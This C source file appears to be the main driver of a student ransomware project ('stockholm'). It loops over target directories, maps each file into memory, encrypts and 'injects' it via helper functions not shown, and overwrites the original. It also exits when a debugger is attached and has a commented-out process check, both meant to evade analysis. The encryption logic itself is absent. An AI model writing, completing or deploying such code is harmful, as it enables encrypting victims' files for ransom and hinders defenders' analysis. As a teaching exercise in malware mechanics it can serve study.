#include "stockholm.h"

unsigned char *g_mapped_data;
uint16_t g_modes;
fa_t_stockhlm_header stockhlm_header;

void fa_loop_throught_directory_and_inject(char *target_dir_path, DIR *dp)
{
	// Pointer to hold directory entry information
	struct dirent *entry;

	// Loop through each entry in the directory
	while ((entry = readdir(dp)) != NULL)
	{
		// Check if the entry name starts with a dot (.)
		// This is to skip the current (.) and parent (..) directory entries
		if (entry->d_name[0] != '.')
		{
			// Create a buffer to hold the full path
			char target_path[1024];

			// Use snprintf() to safely concatenate the strings
			snprintf(target_path, sizeof(target_path), "%s%s", target_dir_path, entry->d_name);

			/* Create a mapping between the target file and the memory region occupied
			 * by the program. This is to facilitate the memory handling to manipulate
			 * the file data.
			 */
			if (fa_map_file_into_memory(target_path) || fa_process_mapped_data()) // Process the encryption, the injection, etc
				continue;														  // Skip the rest of the steps in case of errors
																				  // Write the processed data back into the file
			// Write the final file data in the target path
			fa_write_processed_data_to_file(target_path);
		}
	}
}

int main(int argc, char *argv[])
{
	(void)argc;

	if (pc_is_debugger_attached())
	{
		// TODO del
		printf("Debugger detected. Exiting...\n");
		return 0; // Exit if a debugger is detected
	}

	// const char *process_name = "zsh";
	// if (pc_is_process_running(process_name)) {
	// 	// TODO del
	// 	printf("The process '%s' is running. Exiting...\n", process_name);
	// 	return 0;
	// }

	// Parse the arguments given through the commannd line
	fa_parse_argv(argv);

	// Declare the injection target directory paths
	char *target_dir_paths[FA_TARGET_ARRAY_SIZE] = FA_TARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < FA_TARGET_ARRAY_SIZE; ++i)
	{
		DIR *dp = opendir(target_dir_paths[i]);

		if (!dp)
			return 0;

		fa_loop_throught_directory_and_inject(target_dir_paths[i], dp);

		// Close the directory stream
		closedir(dp);
	}
}
